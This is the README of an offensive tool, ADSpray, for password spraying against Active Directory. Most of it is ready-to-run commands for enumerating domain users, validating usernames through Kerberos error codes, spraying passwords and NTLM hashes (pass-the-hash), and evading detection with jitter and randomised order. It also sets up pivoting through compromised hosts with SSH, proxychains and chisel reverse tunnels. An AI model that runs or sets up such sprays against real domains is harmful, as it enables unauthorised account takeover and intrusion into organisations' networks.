# ADSpray - Active Directory Password Spraying Tool

Active Directory password spraying tool. Hacked together to work over SOCKS for password sprays and further LDAP and other perms access.

## Installation

```bash
python3 -m venv venv
source venv/bin/activate
pip install -r requirements.txt
```

## Usage

### User Enumeration (Reconnaissance)

```bash
# Enumerate all domain users (requires valid credentials)
python adspray.py -d contoso.com -dc 192.168.1.10 --enum-users \
  --auth-user jdoe --auth-pass Password123! \
  --enum-output users.txt

# With NTLM authentication
python adspray.py -d contoso.com -dc 192.168.1.10 --enum-users \
  --auth-user jdoe --auth-pass Password123! --ntlm \
  --enum-output users.txt

# Limit enumeration
python adspray.py -d contoso.com -dc 192.168.1.10 --enum-users \
  --auth-user jdoe --auth-pass Password123! \
  --max-users 100
```

### User Validation (Kerberos Pre-Auth)

```bash
# Validate usernames without passwords (removes invalid users)
python adspray.py -d contoso.com -dc 192.168.1.10 \
  -u potential_users.txt -P "Password1!" \
  --validate-users
```

### Policy Check (Reconnaissance)

```bash
# Anonymous bind (try first)
python adspray.py -d contoso.com -dc 192.168.1.10 --policy-check

# Authenticated bind (if anonymous blocked)
python adspray.py -d contoso.com -dc 192.168.1.10 --policy-check \
  --auth-user jdoe --auth-pass Password123!

# Through proxy with DC authentication
python adspray.py -d contoso.com -dc 192.168.1.10 --policy-check \
  --proxy 127.0.0.1:1080 \
  --auth-user jdoe --auth-pass Password123!
```

### Basic Password Spraying

```bash
# Standard LDAPS spray
python adspray.py -d contoso.com -dc 192.168.1.10 -u users.txt -p passwords.txt

# NTLM hash spray (pass-the-hash)
python adspray.py -d contoso.com -dc 192.168.1.10 -u users.txt -p ntlm_hashes.txt --ntlm

# Stop after finding first valid credential
python adspray.py -d contoso.com -dc 192.168.1.10 -u users.txt -P "Winter2025!" --stop-on-success

# Through SOCKS5 proxy (pivoting)
python adspray.py -d contoso.com -dc 192.168.1.10 -u users.txt -p passwords.txt \
  --proxy 127.0.0.1:1080

# SOCKS4 proxy with authentication
python adspray.py -d contoso.com -dc 192.168.1.10 -u users.txt -p passwords.txt \
  --proxy 127.0.0.1:1080 --proxy-type socks4 --proxy-username user --proxy-password pass

# Single password spray
python adspray.py -d contoso.com -dc 192.168.1.10 -u users.txt -P "Winter2025!"

# Kerberos pre-auth spray
python adspray.py -d contoso.com -dc 192.168.1.10 -u users.txt -p passwords.txt --method kerberos

# With custom timing (slower, stealthier)
python adspray.py -d contoso.com -dc 192.168.1.10 -u users.txt -p passwords.txt \
  --delay 60 --jitter 15 --lockout-threshold 2

# Export results
python adspray.py -d contoso.com -dc 192.168.1.10 -u users.txt -p passwords.txt \
  -o results.json --format json -v
```

### Advanced Options

```bash
# Randomise user order (avoid pattern detection)
python adspray.py -d contoso.com -dc 192.168.1.10 -u users.txt -P "Password1!" --randomise

# Shuffle password order
python adspray.py -d contoso.com -dc 192.168.1.10 -u users.txt -p passwords.txt --shuffle-passwords

# Exclude high-value accounts (from file)
python adspray.py -d contoso.com -dc 192.168.1.10 -u users.txt -P "Winter2025!" \
  --exclude admin_accounts.txt

# Exclude by patterns (wildcard matching)
python adspray.py -d contoso.com -dc 192.168.1.10 -u users.txt -P "Password1!" \
  --exclude-pattern "*admin*,*svc*,*service*"

# Combined OPSEC features
python adspray.py -d contoso.com -dc 192.168.1.10 -u users.txt -p passwords.txt \
  --randomise --exclude-pattern "*admin*" --stop-on-success
```

### Resume Long Sprays

```bash
# Auto-save state after each password
python adspray.py -d contoso.com -dc 192.168.1.10 -u users.txt -p passwords.txt \
  --save-state spray_state.json

# Resume from saved state (picks up where you left off)
python adspray.py -d contoso.com -dc 192.168.1.10 --resume spray_state.json

# Useful for:
# - Long spray campaigns that might be interrupted
# - Network disconnections during spraying
# - Ctrl+C interruptions
# - System reboots
```

### Advanced Workflows

```bash
# Full recon → validated spray workflow
# 1. Enumerate users
python adspray.py -d contoso.com -dc 192.168.1.10 --enum-users \
  --auth-user lowpriv --auth-pass KnownPass123! \
  --enum-output all_users.txt

# 2. Validate users (remove invalid)
python adspray.py -d contoso.com -dc 192.168.1.10 \
  -u all_users.txt -P "Winter2025!" \
  --validate-users --stop-on-success

# Combined: validate + spray
python adspray.py -d contoso.com -dc 192.168.1.10 \
  -u all_users.txt -P "Password1!" \
  --validate-users --stop-on-success --proxy 127.0.0.1:1080
```

### Arguments

**Required:**
- `-d, --domain`: Target domain (e.g., contoso.com)
- `-dc, --domain-controller`: Domain controller IP address
- `-u, --userlist` OR `-U, --username`: Users file or single username (not required for --enum-users or --policy-check)
- `-p, --passlist` OR `-P, --password`: Passwords file or single password (not required for --enum-users or --policy-check)

**Optional:**
- `--method`: Authentication method (ldap, ldaps, ldap-ntlm, ldaps-ntlm, kerberos) [default: ldaps]
- `--delay`: Seconds between attempts [default: 30]
- `--jitter`: Random timing variance [default: 5]
- `--lockout-threshold`: Max failures per user [default: 3]
- `--proxy`: SOCKS proxy (host:port, e.g., 127.0.0.1:1080)
- `--proxy-type`: Proxy type (socks4, socks5, http) [default: socks5]
- `--proxy-username`: Proxy authentication username (for authenticated proxies)
- `--proxy-password`: Proxy authentication password (for authenticated proxies)
- `--auth-user`: Domain username for authenticated operations (policy check, user enum)
- `--auth-pass`: Domain password for authenticated operations
- `--enum-users`: Enumerate all users from AD (requires --auth-user/--auth-pass)
- `--enum-output`: Save enumerated users to file
- `--validate-users`: Validate users via Kerberos pre-auth before spraying
- `--max-users`: Maximum users to enumerate (0 = all) [default: 0]
- `--ntlm`: Treat passwords as NTLM hashes, enable NTLM authentication
- `--stop-on-success`: Stop spray after finding first valid credential
- `--policy-check`: Only check lockout policy, don't spray
- `-o, --output`: Output file path
- `--format`: Output format (json, csv, txt) [default: json]
- `-v, --verbose`: Verbose output

## Features Explained

### User Enumeration
Query AD for all enabled user accounts via authenticated LDAP:
- Requires valid domain credentials (`--auth-user`/`--auth-pass`)
- Supports SIMPLE and NTLM authentication
- Filters disabled accounts automatically
- Saves to file for later use

### Kerberos User Validation
Validate usernames without passwords via Kerberos pre-authentication:
- **No password needed** - uses dummy password to trigger errors
- Distinguishes valid vs invalid usernames by error codes
- Removes invalid users before spraying (improves efficiency)
- Detects disabled and expired accounts

**Error Code Mapping:**
- `KDC_ERR_PREAUTH_FAILED` → Valid user (password wrong)
- `KDC_ERR_C_PRINCIPAL_UNKNOWN` → Invalid user (doesn't exist)
- `KDC_ERR_CLIENT_REVOKED` → Valid but disabled
- `KDC_ERR_KEY_EXPIRED` → Valid with expired password

### NTLM Hash Support
Spray with NTLM hashes instead of plaintext passwords:
- Use `--ntlm` flag to enable
- Automatically switches to NTLM authentication
- Accepts hashes in `LM:NT` or just `NT` format
- Useful for pass-the-hash attacks with captured hashes

### Lockout Policy Detection
Queries domain via LDAP for lockout policy:
- `lockoutThreshold`: Failed attempts before lockout
- `lockoutDuration`: How long account stays locked
- `lockOutObservationWindow`: Time window for counting failures

**Authentication Methods:**
- **Anonymous Bind** (default): Try this first, works if anonymous queries allowed
- **Authenticated Bind** (`--auth-user`/`--auth-pass`): Use valid domain credentials if anonymous blocked

Can be run standalone with `--policy-check` option for reconnaissance.

### SOCKS Proxy Support
Route all traffic through SOCKS proxy for:
- **Pivoting**: Access internal networks through compromised hosts
- **Anonymity**: Route through proxy chains
- **Firewall Bypass**: Tunnel through allowed connections

Supports SOCKS4, SOCKS5, and HTTP proxies with optional authentication.

### Smart Timing
- **User Delay**: Wait between each user attempt
- **Password Delay**: 10x wait between password changes
- **Jitter**: Random variance to avoid pattern detection

### Safe Operation
- Tracks attempts per user
- Stops at lockout threshold
- Large delays between password iterations
- Respects domain policy

## Output Formats

### JSON
```json
[
  {
    "username": "jdoe",
    "password": "Winter2025!",
    "success": true,
    "method": "ldaps",
    "message": "Authentication successful",
    "timestamp": "2025-12-08T12:00:00"
  }
]
```

### CSV
```csv
timestamp,username,password,success,method,message
2025-12-08T12:00:00,jdoe,Winter2025!,true,ldaps,Authentication successful
```

### TXT
```
ADSpray Results
============================================================

jdoe:Winter2025! - Authentication successful
```

## Proxy Setup Examples

### SSH Dynamic Port Forwarding (SOCKS5)
```bash
# Create SOCKS5 proxy on localhost:1080
ssh -D 1080 user@pivot-host

# Use with ADSpray
python adspray.py -d contoso.com -dc 192.168.1.10 -u users.txt -P "Password1!" \
  --proxy 127.0.0.1:1080
```

### ProxyChains
```bash
# Configure proxychains
echo "socks5 127.0.0.1 1080" >> /etc/proxychains.conf

# Run through ProxyChains (alternative method)
proxychains python adspray.py -d contoso.com -dc 192.168.1.10 -u users.txt -P "Password1!"
```

### Chisel SOCKS Proxy
```bash
# On attack box
./chisel server -p 8000 --reverse

# On pivot host
./chisel client attack-box:8000 R:1080:socks

# Use with ADSpray
python adspray.py -d contoso.com -dc 192.168.1.10 -u users.txt -P "Password1!" \
  --proxy 127.0.0.1:1080
```

## Troubleshooting

**"ldap3 required"**
```bash
pip install ldap3
```

**"Kerberos not available"**
```bash
pip install impacket
```

**"PySocks not available"**
```bash
pip install PySocks
```

**"Could not retrieve lockout policy"**
- Check network connectivity to DC
- Verify DC IP is correct
- Try LDAPS (port 636) if LDAP (port 389) is blocked

**"Connection timeout"**
- Verify domain controller IP
- Check firewall rules (ports 389, 636, 88)
- Ensure DNS resolution for domain
- Verify proxy is working if configured

**"Proxy connection failed"**
- Verify proxy host and port
- Check proxy authentication credentials
- Test proxy with curl: `curl --socks5 127.0.0.1:1080 http://example.com`
- Ensure proxy type matches (socks4/socks5/http)
